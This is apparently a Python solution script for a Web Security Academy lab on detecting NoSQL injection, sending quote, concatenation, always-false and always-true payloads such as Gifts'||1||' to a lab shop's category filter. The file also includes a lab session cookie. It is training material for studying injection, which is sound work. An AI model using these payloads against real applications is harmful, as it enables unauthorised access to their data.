# NoSQL injection 8 of 24
# Lab: Detecting NoSQL injection

import asyncio
from pprint import pprint
from common.base import run_payloads
from urllib.parse import quote_plus as urlencode_str

RAW_REQUEST = """
GET /filter?category=@@@PAYLOAD@@@ HTTP/2
Host: 0ad00059032ec64180f51c4700b800f0.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:154.0) Gecko/20100101 Firefox/154.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Referer: https://0ad00059032ec64180f51c4700b800f0.web-security-academy.net/
Cookie: session=fVR824lF8Krb3sy5nLNQGnPGur698tNJ
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache
""".strip()

async def one_call(raw_req):
    """A simple call. Returns the response"""

    result = await run_payloads(raw_req, [{}], lambda x: True)
    return result

async def print_net_result(raw_req, print_response_body=False):
    result = await one_call(raw_req)
    if result['status_code'] == 200:
        secs = result['total_seconds']
        print(f" CALL OK, {secs:.2f} secs")
        if print_response_body: pprint(result['full_text'])
        return True, result['full_text']
    else:
        print(" CALL FAILED")
        if print_response_body: pprint(result['full_text'])
        return False, result['full_text']

def xmlencode (text: str) -> str:
    return "".join(f"&#x{ord(c):X};" for c in text)

async def main():

    raw_req_0 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "Gifts")
    print('PLAIN CALL:', end='')
    _, response = await print_net_result(raw_req_0, False)
    print(f"    Products: {response.count('href="/product?productId=')}")

    # It fails and in response - if printed - we can see that the database is mongodb!
    raw_req_3 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "'")
    print('Invalid syntax:', end='')
    await print_net_result(raw_req_3, False)

    # It succeeds, response is the original
    # NOTE: Using BURP, make sure to URL-encode the payload by highlighting it and using the Ctrl-U hotkey
    raw_req_4 = RAW_REQUEST.replace("@@@PAYLOAD@@@", urlencode_str("Gifts'+'"))
    print('Using useless but valid concatenation:', end='')
    _, response = await print_net_result(raw_req_4, False)
    print(f"    Products: {response.count('href="/product?productId=')}")

    # It succeeds, always false condition -> no products returned
    raw_req_5a = RAW_REQUEST.replace("@@@PAYLOAD@@@", urlencode_str("Gifts' && 0 && 'x"))
    print('Always false condition:', end='')
    _, response = await print_net_result(raw_req_5a, False)
    print(f"    Products: {response.count('href="/product?productId=')}")

    # It succeeds, unchanging condition, Gifts products returned
    raw_req_5b = RAW_REQUEST.replace("@@@PAYLOAD@@@", urlencode_str("Gifts' && 1 && 'x"))
    print('Unchanging condition:', end='')
    _, response = await print_net_result(raw_req_5b, False)
    print(f"    Products: {response.count('href="/product?productId=')}")

    # It succeeds, always true condition, all products returned
    raw_req_6 = RAW_REQUEST.replace("@@@PAYLOAD@@@", urlencode_str("Gifts'||1||'"))
    print('Always true condition:', end='')
    _, response = await print_net_result(raw_req_6, False)
    print(f"    Products: {response.count('href="/product?productId=')}")

if __name__ == "__main__":
    asyncio.run(main())